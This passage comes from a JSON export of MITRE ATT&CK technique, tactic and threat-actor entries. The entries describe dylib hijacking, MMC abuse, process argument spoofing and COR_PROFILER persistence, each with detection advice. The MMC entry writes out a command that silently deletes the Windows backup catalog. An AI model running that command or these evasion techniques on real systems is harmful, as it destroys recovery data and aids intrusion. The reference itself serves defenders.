      "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.004",
      "stix_id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
      "created": "2020-03-16T15:23:30.896000+00:00",
      "modified": "2025-04-15T19:59:24.300000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "File: File Creation",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\nRun path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)"
    },
    "T1601.002": {
      "id": "T1601.002",
      "name": "Downgrade System Image",
      "description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1601.002",
      "stix_id": "attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d",
      "created": "2020-10-19T19:53:10.576000+00:00",
      "modified": "2025-04-25T14:48:39.086000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. "
    },
    "T1078.003": {
      "id": "T1078.003",
      "name": "Local Accounts",
      "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1078.003",
      "stix_id": "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2",
      "created": "2020-03-13T20:26:46.695000+00:00",
      "modified": "2025-04-15T19:59:24.607000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Containers",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Logon Session: Logon Session Metadata",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours."
    },
    "T1669": {
      "id": "T1669",
      "name": "Wi-Fi Networks",
      "description": "Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks \u2014 requiring [Valid Accounts](https://attack.mitre.org/techniques/T1078) \u2014 belonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. \n\nAdversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target\u2019s Wi-Fi network.(Citation: Nearest Neighbor Volexity)\n\nOnce an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1669",
      "stix_id": "attack-pattern--fde016f6-211a-41c8-a4ab-301f1e419c62",
      "created": "2025-02-25T15:49:33.963000+00:00",
      "modified": "2025-04-15T19:59:24.690000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation",
        "Firewall: Firewall Rule Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1211": {
      "id": "T1211",
      "name": "Exploitation for Defense Evasion",
      "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1211",
      "stix_id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:59:24.778000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "SaaS",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery."
    },
    "T1127": {
      "id": "T1127",
      "name": "Trusted Developer Utilities Proxy Execution",
      "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\n\nSmart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \"reputation hijacking\" to abuse an operating system\u2019s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1127",
      "stix_id": "attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b",
      "created": "2017-05-31T21:31:39.262000+00:00",
      "modified": "2025-04-15T19:59:24.863000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Module: Module Load",
        "Process: Process Metadata",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed."
    },
    "T1529": {
      "id": "T1529",
      "name": "System Shutdown/Reboot",
      "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1529",
      "stix_id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
      "created": "2019-10-04T20:42:28.541000+00:00",
      "modified": "2025-04-15T19:59:24.950000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Sensor Health: Host Status",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the <code>reload</code> command."
    },
    "T1218.014": {
      "id": "T1218.014",
      "name": "MMC",
      "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.014",
      "stix_id": "attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407",
      "created": "2021-09-28T01:36:41.638000+00:00",
      "modified": "2025-04-16T20:37:23.449000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line parameters for suspicious or malicious use of MMC. Since MMC is a signed Windows binary, verify use of MMC is legitimate and not malicious. \n\nMonitor for creation and use of .msc files. MMC may legitimately be used to call Microsoft-created .msc files, such as <code>services.msc</code> or <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files may be an indicator of malicious activity. "
    },
    "T1564.010": {
      "id": "T1564.010",
      "name": "Process Argument Spoofing",
      "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.010",
      "stix_id": "attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1",
      "created": "2021-11-19T14:13:11.335000+00:00",
      "modified": "2025-04-25T14:48:40.519000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution. These changes may bypass process creation detection and/or later process memory analysis. Consider monitoring for [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments."
    },
    "T1574.012": {
      "id": "T1574.012",
      "name": "COR_PROFILER",
      "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.012",
      "stix_id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
      "created": "2020-06-24T22:30:55.843000+00:00",
      "modified": "2025-04-25T14:48:41.257000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables."
    }
  },
  "tactics": {
    "TA0006": {
      "id": "TA0006",
      "name": "Credential Access",
      "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
      "shortname": "credential-access",
      "url": "https://attack.mitre.org/tactics/TA0006",
      "stix_id": "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:32.408000+00:00"
    },
    "TA0002": {
      "id": "TA0002",
      "name": "Execution",
      "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
      "shortname": "execution",
      "url": "https://attack.mitre.org/tactics/TA0002",
      "stix_id": "x-mitre-tactic--4ca45d45-df4d-4613-8980-bac22d278fa5",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:32.769000+00:00"
    },
    "TA0040": {
      "id": "TA0040",
      "name": "Impact",
      "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries\u2019 goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
      "shortname": "impact",
      "url": "https://attack.mitre.org/tactics/TA0040",
      "stix_id": "x-mitre-tactic--5569339b-94c2-49ee-afb3-2222936582c8",
      "created": "2019-03-14T18:44:44.639000+00:00",
      "modified": "2025-04-25T14:45:33.130000+00:00"
    },
    "TA0003": {
      "id": "TA0003",
      "name": "Persistence",
      "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
      "shortname": "persistence",
      "url": "https://attack.mitre.org/tactics/TA0003",
      "stix_id": "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:33.492000+00:00"
    },
    "TA0004": {
      "id": "TA0004",
      "name": "Privilege Escalation",
      "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
      "shortname": "privilege-escalation",
      "url": "https://attack.mitre.org/tactics/TA0004",
      "stix_id": "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:33.853000+00:00"
    },
    "TA0008": {
      "id": "TA0008",
      "name": "Lateral Movement",
      "description": "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ",
      "shortname": "lateral-movement",
      "url": "https://attack.mitre.org/tactics/TA0008",
      "stix_id": "x-mitre-tactic--7141578b-e50b-4dcc-bfa4-08a8dd689e9e",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:34.223000+00:00"
    },
    "TA0005": {
      "id": "TA0005",
      "name": "Defense Evasion",
      "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
      "shortname": "defense-evasion",
      "url": "https://attack.mitre.org/tactics/TA0005",
      "stix_id": "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:34.581000+00:00"
    },
    "TA0010": {
      "id": "TA0010",
      "name": "Exfiltration",
      "description": "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they\u2019ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
      "shortname": "exfiltration",
      "url": "https://attack.mitre.org/tactics/TA0010",
      "stix_id": "x-mitre-tactic--9a4e74ab-5008-408c-84bf-a10dfbc53462",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:34.933000+00:00"
    },
    "TA0007": {
      "id": "TA0007",
      "name": "Discovery",
      "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
      "shortname": "discovery",
      "url": "https://attack.mitre.org/tactics/TA0007",
      "stix_id": "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:35.302000+00:00"
    },
    "TA0009": {
      "id": "TA0009",
      "name": "Collection",
      "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
      "shortname": "collection",
      "url": "https://attack.mitre.org/tactics/TA0009",
      "stix_id": "x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-09-05T18:27:09.070000+00:00"
    },
    "TA0042": {
      "id": "TA0042",
      "name": "Resource Development",
      "description": "The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing certificates to help with Defense Evasion.",
      "shortname": "resource-development",
      "url": "https://attack.mitre.org/tactics/TA0042",
      "stix_id": "x-mitre-tactic--d679bca2-e57d-4935-8650-8031c87a4400",
      "created": "2020-09-30T16:11:59.650000+00:00",
      "modified": "2025-04-25T14:45:35.841000+00:00"
    },
    "TA0043": {
      "id": "TA0043",
      "name": "Reconnaissance",
      "description": "The adversary is trying to gather information they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.",
      "shortname": "reconnaissance",
      "url": "https://attack.mitre.org/tactics/TA0043",
      "stix_id": "x-mitre-tactic--daa4cbb1-b4f4-4723-a824-7f1efd6e0592",
      "created": "2020-10-02T14:48:41.809000+00:00",
      "modified": "2025-04-25T14:45:36.201000+00:00"
    },
    "TA0011": {
      "id": "TA0011",
      "name": "Command and Control",
      "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.",
      "shortname": "command-and-control",
      "url": "https://attack.mitre.org/tactics/TA0011",
      "stix_id": "x-mitre-tactic--f72804c5-f15a-449e-a5da-2eecd181f813",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:36.561000+00:00"
    },
    "TA0001": {
      "id": "TA0001",
      "name": "Initial Access",
      "description": "The adversary is trying to get into your network.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.",
      "shortname": "initial-access",
      "url": "https://attack.mitre.org/tactics/TA0001",
      "stix_id": "x-mitre-tactic--ffd5bcee-6e16-4dd2-8eca-7b3beedf33ca",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:45:36.917000+00:00"
    }
  },
  "threat_actors": {
    "G0119": {
      "id": "G0119",
      "name": "Indrik Spider",
      "description": "[Indrik Spider](https://attack.mitre.org/groups/G0119) is a Russia-based cybercriminal group that has been active since at least 2014. [Indrik Spider](https://attack.mitre.org/groups/G0119) initially started with the [Dridex](https://attack.mitre.org/software/S0384) banking Trojan, and then by 2017 they began running ransomware operations using [BitPaymer](https://attack.mitre.org/software/S0570), [WastedLocker](https://attack.mitre.org/software/S0612), and Hades ransomware. Following U.S. sanctions and an indictment in 2019, [Indrik Spider](https://attack.mitre.org/groups/G0119) changed their tactics and diversified their toolset.(Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019)",
      "aliases": [
        "Indrik Spider",
        "Evil Corp",
        "Manatee Tempest",
        "DEV-0243",
        "UNC2165"
      ],
      "techniques": [
        "T1003.001",
        "T1587.001",
        "T1136",
        "T1112",
        "T1036.005",
        "T1007",
